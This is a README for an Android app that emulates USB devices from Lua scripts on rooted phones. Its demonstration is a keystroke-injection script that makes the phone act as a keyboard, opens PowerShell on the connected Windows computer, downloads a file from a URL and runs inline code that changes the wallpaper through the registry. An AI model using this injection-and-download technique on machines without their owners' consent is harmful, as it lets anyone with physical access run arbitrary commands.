# Android USB Script

**Use at your own risk. For educational purposes only.**

An Android app that provides a simple Lua interface for enumerating and interfacing
with arbitrary composite USB devices.

**Root access is required.**

## [Demonstration](https://streamable.com/oeyrik)

The best way to explain what this app does is with a code example. The following script
does the following when interpreted by this app:

1. Configures your phone to become a USB keyboard
2. Sends a series of key presses to the computer your phone is plugged in to, changing
its wallpaper

```lua
-- create a USB composite device composed of a single keyboard
usb = luausb.create({ id = 0, type = "keyboard" })
kb = usb.dev[1]

local file = prompt("Wallpaper to download?", "https://i.imgur.com/46wWHZ3.png")

while true do
    print("idle")

    -- wait for the phone to be plugged into a computer
    while usb.state() == "not attached" do
        wait(1000)
    end

    print("running")
    wait(1000)

    kb.chord(MOD_LSUPER, KEY_R)     -- open Windows run dialog
    wait(2000)                      -- wait for it to open
    kb.string("powershell\n")       -- open powershell
    wait(2000)
    -- execute a script that downloads and changes the wallpaper
    kb.string("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ..
            "(new-object System.Net.WebClient).DownloadFile('" .. file .. "',\"$Env:Temp\\b.jpg\");\n" ..
            "Add-Type @\"\n" ..
            "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" ..
            "ce W{public class S{ [DllImport(\"user32.dll\")]static extern int SystemParamet" ..
            "ersInfo(int a,int b,string c,int d);public static void SW(string a){SystemParam" ..
            "etersInfo(20,0,a,3);RegistryKey c=Registry.CurrentUser.OpenSubKey(\"Control Pan" ..
            "el\\\\Desktop\",true);c.SetValue(@\"WallpaperStyle\", \"2\");c.SetValue(@\"Tile" ..
            "Wallpaper\", \"0\");c.Close();}}}\n" ..
            "\"@\n" ..
            "[W.S]::SW(\"$Env:Temp\\b.jpg\")\n" ..
            "exit\n")

    print("done")
    -- wait until the phone is unplugged
    while usb.state() == "configured" do
        wait(1000)
    end
end
```

Several other sample scripts are
[included in the repository](https://github.com/Netdex/android-usb-script/tree/master/app/src/main/assets/scripts).

## Requirements
**This app will not work on every Android device.** If your Android OS has Linux Kernel
version >= 3.18 and is compiled with configfs and f_hid, then the app can try to create usb
gadgets.

New demo applications can be added to `assets/scripts`. The API is pretty much self-documenting,
just look at the existing demos to get a feel for how the API works.

## Third-party
- [libsuperuser](https://github.com/Chainfire/libsuperuser)
- [LuaJ](http://www.luaj.org/luaj/3.0/README.html)
